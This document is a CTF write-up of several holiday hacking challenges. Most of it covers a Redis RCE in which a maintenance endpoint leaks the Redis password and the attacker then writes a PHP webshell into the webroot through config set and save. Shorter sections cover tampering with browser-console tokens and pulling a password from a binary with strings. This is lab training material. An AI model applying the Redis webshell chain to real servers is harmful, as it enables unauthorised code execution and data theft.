## Redis RCE

Difficulty - 

There is a terminal in the kitchen running a web app that has a Redis DB on the backend, it is assumed vulnerable to RCE!

Lets take a look here...

The terminal reports 

```
We need your help!!
The server stopped working, all that's left is the maintenance port.
To access it, run:
curl http://localhost/maintenance.php
We're pretty sure the bug is in the index page. Can you somehow use the
maintenance page to view the source code for the index page?
```

And the hint we are provided points at this article

https://book.hacktricks.xyz/pentesting/6379-pentesting-redis

```
curl http://localhost/maintenance.php
ERROR: 'cmd' argument required (use commas to separate commands); eg:
curl http://localhost/maintenance.php?cmd=help
curl http://localhost/maintenance.php?cmd=mget,example1
```

```
curl http://localhost/maintenance.php?cmd=whoami
Running: redis-cli --raw -a '<password censored>' 'whoami'
ERR unknown command `whoami`, with args beginning with: 
```

Ah ok so the cmd param is being inserted into a redis-cli command! 

```
curl http://localhost/maintenance.php?cmd=info  
Running: redis-cli --raw -a '<password censored>' 'info'
# Server
redis_version:5.0.3
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:1b271fe49834c463
redis_mode:standalone
os:Linux 4.19.0-13-cloud-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:8.3.0
process_id:6
run_id:34216f4fe22c45b2833c2b23cfefe6fc96801f52
tcp_port:6379
uptime_in_seconds:140
uptime_in_days:0
hz:10
configured_hz:10
...
```

Boom ok so we are getting somewhere!

Well lets try and actually connect 

```
redis-cli -h localhost
```

That works!

But it looks like we need auth, lets see if we can find the config file anywhere

The info command from above shows the config file is found at /usr/local/etc/redis/redis.conf lets try cat-ing that file

Hmm, permissions denied. Well, lets try setting temp creds through the web commands!

`curl http://localhost/maintenance.php?cmd=config+set+requirepass+pass`

No permissions, and no tools such as nmap or msf to bruteforce so it must be the cmd param that we have to do all of this from.

```
player@9a2f1c267db8:~$ curl http://localhost/maintenance.php?cmd=help
Running: redis-cli --raw -a '<password censored>' 'help'
redis-cli 5.0.3
To get help about Redis commands type:
      "help @<group>" to get a list of commands in <group>
      "help <command>" for help on <command>
      "help <tab>" to get a list of possible help topics
      "quit" to exit
To set redis-cli preferences:
      ":set hints" enable online hints
      ":set nohints" disable online hints
Set your preferences in ~/.redisclirc
```

So the elf in the kitchen mentioned something about commas, looks like instead of using plusses or %20 which are the URL encoded characters for whitespace, we want to use commas!

```
curl http://localhost/maintenance.php?cmd=CONFIG,GET,*
Running: redis-cli --raw -a '<password censored>' 'CONFIG' 'GET' '*'
dbfilename
dump.rdb
requirepass
R3disp@ss
masterauth
cluster-announce-ip
unixsocket
logfile
pidfile
/var/run/redis_6379.pid
slave-announce-ip
replica-announce-ip
maxmemory
0
proto-max-bulk-len
536870912
client-query-buffer-limit
1073741824
...
```
This looks interesting, lets connect to the server and try authing

```
redis-cli -h localhost

> AUTH R3disp@ss
OK
```

Boom we are in! Ok now to get index.php...
<?php system('cat index.php');?> 

So `config get *` shows that `dir` is set to `/` which we can change, it also shows that the dbfilename, which is dump.rdb. The hint provides us another clue with what we want to do...

```
Redis RCE
Webshell
From: http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html
You must know the path of the Web site folder:
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK
​If the webshell access exception, you can empty the database after backup and try again, remember to restore the database.
```

So if we can set the dir to the webroot, and then anything we put in dbfilename is hosted there, lets try setting the dbfilename to something like emerson.php and the dir to /var/www/html which is where index.php resides. Lastly we need to find a way to cat index.php, that can be accomplished by triggering this php code snippet that will be in emerson.php `<?php system('cat index.php');?>`

So while authed to redis:
```
localhost:6379> config set dir /var/www/html
OK
localhost:6379> config set dbfilename emerson.php
OK
localhost:6379> set emerson "<?php system('cat index.php');?>"
OK
localhost:6379> save
OK

```

Now lets go for the kill!
```
layer@685d44f504ac:~$ curl http://localhost/emerson.php --output -
REDIS0009�      redis-ver5.0.3�
�edis-bits�@�ctime�NI�_used-mem ?
 aof-preamble��� foobar  emerson <?php
# We found the bug!!
#
#         \   /
#         .\-/.
#     /\ ()   ()
#       \/~---~\.-~^-.
# .-~^-./   |   \---.
#      {    |    }   \
#    .-~\   |   /~-.
#   /    \  A  /    \
#         \/ \/
# 
echo "Something is wrong with this page! Please use http://localhost/maintenance.php to se
e if you can figure out what's going on"
?>
/var/www/htmexample1The site is in maintenance modeexample2#We think there's a bug in inde
x.php
dbfilename
          emerson.php����4 �player@685d44f504ac:~$ 

```

## Operate the SantaVator!

This one is a classic example of client side security. If we click on the panel on the wall and open up the developer tools of the browser and browse to `app.js` we can dig around and see that there is an array called `tokens` which is created by parsing the token set in local storage that contains all of the current items in the player's inventory. If we set a breakpoint before the contents of this array are verified, for example line 262, we can allow the JS to execute up to that line, then navigate to the console and type the following 3 commands to spawn the lights. Repeat with other items as necessary
```
tokens.push("greenlight");
tokens.push("redlight");
tokens.push("yellowlight");
tokens.push("workshop-button");
```
Which are the 4 items needed for a powered elevator and the workshop, I am not gonna say how I got this one explicitly, its worth digging through the source code to find this one. 

Boom we've got it! (Note I picked up the 2 knuts and candycane on my own but just got sick of looking for the lights lol)

Note: If you dont eventually gather all the items, you will have to repeat these commands every time you want to power on the elevator.

## HID Box 

## Password in Binary

This is pretty easy! Bushy Evergreen needs a password from a binary and mentions "human readable strings" so lets try the `strings` and just a little grep

```
elf@39e34b976723 ~/lab $ strings door | grep -i password 
/home/elf/doorYou look at the screen. It wants a password. You roll your eyes - the 
password is probably stored right in the binary. There's gotta be a
Be sure to finish the challenge in prod: And don't forget, the password is "Op3nTheD00r"
Beep boop invalid password
```

```
./door
What do you enter? > Op3nTheD00r
Checking......
Door opened!
```

Nice

